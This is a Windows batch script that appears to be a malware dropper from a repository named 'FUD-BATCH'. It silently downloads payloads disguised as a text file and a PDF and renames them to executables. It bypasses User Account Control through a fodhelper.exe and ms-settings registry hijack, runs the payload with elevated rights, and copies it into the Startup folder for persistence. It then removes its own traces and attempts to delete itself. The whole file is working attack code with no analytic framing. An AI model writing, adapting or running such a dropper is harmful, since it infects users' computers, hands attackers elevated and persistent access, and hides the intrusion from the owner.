@echo off
setlocal

:: Step 1: Set the download URL and the target paths for test.txt and config.exe
set "url1=https://raw.githubusercontent.com/altabross/FUD-BATCH/refs/heads/main/test.txt"
set "txt_output=%USERPROFILE%\config.txt"
set "exe_output=%USERPROFILE%\config.exe"

:: Step 2: Download the config.txt file using PowerShell silently
powershell -command "Invoke-WebRequest -Uri '%url1%' -OutFile '%txt_output%' -UseBasicP -ErrorAction Stop" >nul 2>&1

:: Check if config.txt exists, and exit if download fails
if not exist "%txt_output%" exit /b 1

:: Step 3: Wait for 4 seconds before converting the file
timeout /t 4 /nobreak >nul 2>&1

:: Step 4: Convert config.txt to config.exe by renaming silently
ren "%txt_output%" "config.exe" >nul 2>&1

:: Step 5: Create the registry key for ms-settings silently
set "reg_key=HKCU\Software\Classes\ms-settings\Shell\Open\command"
reg add "%reg_key%" /f >nul 2>&1

:: Step 6: Set DelegateExecute property silently
reg add "%reg_key%" /v DelegateExecute /t REG_SZ /d "" /f >nul 2>&1

:: Step 7: Set default value to run config.exe silently
reg add "%reg_key%" /ve /t REG_SZ /d "%exe_output%" /f >nul 2>&1

:: Step 8: Wait for 10 seconds before starting fodhelper.exe
timeout /t 10 /nobreak >nul 2>&1

:: Step 9: Start fodhelper.exe silently to escalate privileges
start /min "" "C:\Windows\System32\fodhelper.exe" >nul 2>&1

:: Step 10: Wait for 8 seconds to allow privilege escalation
timeout /t 8 /nobreak >nul 2>&1

:: Remove the ms-settings registry key immediately before self-deletion
powershell -command "Remove-Item 'HKCU:\Software\Classes\ms-settings\' -Recurse -Force" >nul 2>&1

:: Step 11: Download the Client.pdf file using PowerShell silently
set "url2=https://raw.githubusercontent.com/altabross/FUD-BATCH/refs/heads/main/Client.pdf"
set "output2=C:\ProgramData\sam.exe"
powershell -command "Invoke-WebRequest -Uri '%url2%' -OutFile '%output2%' -UseBasicP -ErrorAction Stop" >nul 2>&1

:: Check if Client.pdf download is successful
if not exist "%output2%" exit /b 1

:: Step 12: Convert Client.pdf to sam.exe by renaming silently
ren "%output2%" "sam.exe" >nul 2>&1

:: Step 13: Run sam.exe two times silently
start /min "" "%output2%" >nul 2>&1
timeout /t 2 /nobreak >nul 2>&1
start /min "" "%output2%" >nul 2>&1

:: Step 14: Delete config.exe after executing sam.exe
del "%exe_output%" >nul 2>&1

:: Step 15: Delete Client.pdf (but keep sam.exe)
del "%output2%" >nul 2>&1

:: Step 16: Add sam.exe to startup folder (this ensures it runs automatically at system startup)
set "startup_folder=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
copy "%output2%" "%startup_folder%\sam.exe" >nul 2>&1

:: Step 17: Create a secondary batch script to delete this script
(
echo @echo off
echo del "%~f0" ^>nul 2^>^&1
echo if exist "%~f0" goto Repeat
) > "%TEMP%\delete_self.bat"

:: Run the secondary batch script to delete this script
start /min "" "%TEMP%\delete_self.bat"

endlocal
